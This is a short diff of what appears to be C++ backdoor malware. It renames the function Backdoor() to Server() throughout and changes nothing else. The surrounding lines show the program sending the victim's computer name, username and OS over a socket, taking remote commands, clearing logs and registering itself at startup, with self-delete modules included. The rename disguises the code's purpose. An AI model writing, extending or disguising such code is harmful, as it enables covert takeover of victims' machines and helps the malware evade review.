@@ -42,7 +42,7 @@ const int timeout = 300000;
 #include "DeleteDirectory.cpp"
 #include "DeleteSelf.cpp"
 
-void Backdoor()
+void Server()
 {
     WSADATA wsdata;
     sockaddr_in client;
@@ -61,7 +61,7 @@ void Backdoor()
         closesocket(objSocket);
         WSACleanup();
         Sleep(1000);
-        Backdoor();
+        Server();
     }
 
     send(computer + "\n" + username + "\n" + operatingSystem + "\n" + fileName);
@@ -75,7 +75,7 @@ void Backdoor()
             closesocket(objSocket);
             WSACleanup();
             ClearLogs();
-            Backdoor();
+            Server();
         
         } command = buffer;
 
@@ -172,5 +172,5 @@ int main()
         return EXIT_FAILURE;
     }
     if (startup) RegisterStartup(fileName);
-    Backdoor();
+    Server();
 }
